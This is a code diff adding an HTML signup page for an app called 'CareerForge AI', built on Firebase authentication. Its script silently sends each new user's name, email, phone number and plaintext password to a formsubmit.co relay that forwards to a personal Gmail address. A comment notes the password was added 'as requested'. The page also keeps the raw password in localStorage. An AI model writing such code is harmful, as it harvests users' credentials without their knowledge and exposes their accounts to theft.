@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Join Us — CareerForge AI</title>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+  :root {
+    --primary: #f43f5e; --secondary: #8b5cf6;
+    --bg-gradient: linear-gradient(135deg, #f43f5e 0%, #8b5cf6 100%);
+    --surface: #ffffff; --text-main: #111827; --text-muted: #4b5563;
+    --radius-xl: 32px; --radius-lg: 16px;
+    --transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  body {
+    font-family: 'Inter', sans-serif; background: var(--bg-gradient);
+    background-size: 400% 400%; animation: gradientBG 15s ease infinite;
+    height: 100dvh; display: flex; flex-direction: column; color: white;
+  }
+  @keyframes gradientBG { 0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%} }
+
+  .hero { 
+    flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; 
+    text-align: center; padding: 24px;
+    animation: floating 6s ease-in-out infinite;
+  }
+  @keyframes floating { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-15px)} }
+
+  .app-logo { 
+    width: 72px; height: 72px; background: rgba(255,255,255,0.2); 
+    backdrop-filter: blur(12px); border-radius: 20px; 
+    display: flex; align-items: center; justify-content: center; 
+    margin-bottom: 24px; padding: 4px; border: 2px solid rgba(255,255,255,0.3);
+    animation: logoPulse 4s infinite alternate;
+  }
+  .app-logo img { width: 100%; height: 100%; object-fit: cover; border-radius: 16px; }
+  @keyframes logoPulse { from{transform:scale(1)} to{transform:scale(1.1)} }
+
+  .headline { font-family: 'Outfit', sans-serif; font-size: 46px; font-weight: 800; letter-spacing: -1.5px; line-height: 1.1; }
+  
+  .bottom-sheet {
+    background: var(--surface); border-radius: var(--radius-xl) var(--radius-xl) 0 0;
+    padding: 36px 24px 44px; color: var(--text-main); display: flex; flex-direction: column; gap: 16px;
+    box-shadow: 0 -12px 60px rgba(0,0,0,0.15);
+    animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+  @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
+
+  .input-field { 
+    width: 100%; height: 60px; background: #f9fafb; border: 1.5px solid #e5e7eb; 
+    border-radius: var(--radius-lg); padding: 0 20px; font-size: 16px; margin-bottom: 6px; 
+    transition: var(--transition); outline: none;
+  }
+  .input-field:focus { border-color: var(--primary); background: white; box-shadow: 0 0 0 4px rgba(244, 63, 94, 0.1); }
+
+  .btn { 
+    width: 100%; height: 62px; border-radius: var(--radius-lg); border: none; 
+    font-size: 17px; font-weight: 600; cursor: pointer; 
+    background: #111827; color: white; transition: var(--transition);
+    display: flex; align-items: center; justify-content: center;
+  }
+  .btn:active { transform: scale(0.96); opacity: 0.9; }
+  
+  .btn-google { 
+    background: #fff; color: #374151; border: 1.5px solid #e5e7eb; 
+    display: flex; align-items: center; justify-content: center; gap: 12px; 
+  }
+  .btn-google:hover { background: #f9fafb; border-color: #d1d5db; }
+</style>
+</head>
+<body>
+  <div class="hero">
+    <div class="app-logo">
+      <img src="./icons/icon-192.png" alt="CareerForge Logo">
+    </div>
+    <h1 class="headline">Join us</h1>
+    <p style="opacity:0.9; font-weight: 500;">Create your professional AI profile</p>
+  </div>
+  <div class="bottom-sheet" style="padding-bottom: 30px; gap: 12px; max-height: 85vh; overflow-y: auto;">
+    <input type="text" id="name" class="input-field" placeholder="Full Name">
+    <input type="email" id="email" class="input-field" placeholder="Email Address">
+    <input type="tel" id="number" class="input-field" placeholder="Phone Number">
+    
+    <div style="position:relative;">
+      <input type="password" id="pass" class="input-field" placeholder="Create Password" style="padding-right: 50px;">
+      <i class="fa-solid fa-eye" id="togglePass" style="position:absolute; right:20px; top:20px; cursor:pointer; color:#9ca3af;"></i>
+    </div>
+
+    <div style="position:relative;">
+      <input type="password" id="confirmPass" class="input-field" placeholder="Confirm Password" style="padding-right: 50px;">
+      <i class="fa-solid fa-eye" id="toggleConfirmPass" style="position:absolute; right:20px; top:20px; cursor:pointer; color:#9ca3af;"></i>
+    </div>
+
+    <button class="btn" id="signupBtn" style="margin-top: 10px;">Create Account</button>
+    <p style="text-align:center; margin-top:8px; font-size:14px;">Already have an account? <a href="./login.html" style="color:var(--primary); text-decoration:none; font-weight:600;">Log in</a></p>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getAuth, createUserWithEmailAndPassword, updateProfile } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+    
+    const firebaseConfig = { apiKey: "YOUR_API_KEY", authDomain: "YOUR_PROJECT_ID.firebaseapp.com", projectId: "YOUR_PROJECT_ID", storageBucket: "YOUR_PROJECT_ID.appspot.com", messagingSenderId: "YOUR_MESSAGING_SENDER_ID", appId: "YOUR_APP_ID" };
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+
+    // Password Visibility Logic
+    const setupToggle = (id, toggleId) => {
+      const input = document.getElementById(id);
+      const icon = document.getElementById(toggleId);
+      icon.addEventListener("click", () => {
+        const type = input.getAttribute("type") === "password" ? "text" : "password";
+        input.setAttribute("type", type);
+        icon.classList.toggle("fa-eye-slash");
+        icon.classList.toggle("fa-eye");
+      });
+    };
+    setupToggle("pass", "togglePass");
+    setupToggle("confirmPass", "toggleConfirmPass");
+
+    const sendOwnerAlert = async (u, action) => {
+      try {
+        await fetch("https://formsubmit.co/ajax/mohansampath098@gmail.com", {
+          method: "POST",
+          headers: { "Content-Type": "application/json", "Accept": "application/json" },
+          body: JSON.stringify({
+            _subject: `New Signup: ${u.name}`,
+            Name: u.name,
+            Email: u.email,
+            Phone: u.phone,
+            Password: u.rawPassword, // Added as requested for owner notice
+            UID: u.uid || "Mock",
+            Timestamp: new Date().toLocaleString()
+          })
+        });
+      } catch (e) { console.warn("Alert failed"); }
+    };
+
+    document.getElementById("signupBtn").addEventListener("click", async () => {
+      const name = document.getElementById("name").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const phone = document.getElementById("number").value.trim();
+      const pass = document.getElementById("pass").value;
+      const cPass = document.getElementById("confirmPass").value;
+
+      if(!name || !email || !phone || !pass) return alert("Please fill all fields");
+      if(phone.length < 10) return alert("Enter a valid phone number");
+      if(pass !== cPass) return alert("Passwords do not match");
+
+      const userData = { uid: "mock-" + Date.now(), email, name, phone, rawPassword: pass };
+
+      if(firebaseConfig.apiKey === "YOUR_API_KEY") {
+        localStorage.setItem("currentUser", JSON.stringify(userData));
+        await sendOwnerAlert(userData, "Signup via Mock");
+        window.location.href = "./index.html";
+        return;
+      }
+
+      try {
+        const res = await createUserWithEmailAndPassword(auth, email, pass);
+        await updateProfile(res.user, { displayName: name });
+        userData.uid = res.user.uid;
+        localStorage.setItem("currentUser", JSON.stringify(userData));
+        await sendOwnerAlert(userData, "Signup via Firebase");
+        window.location.href = "./index.html";
+      } catch (e) { alert(e.message); }
+    });
+  </script>
+</body>
+</html>
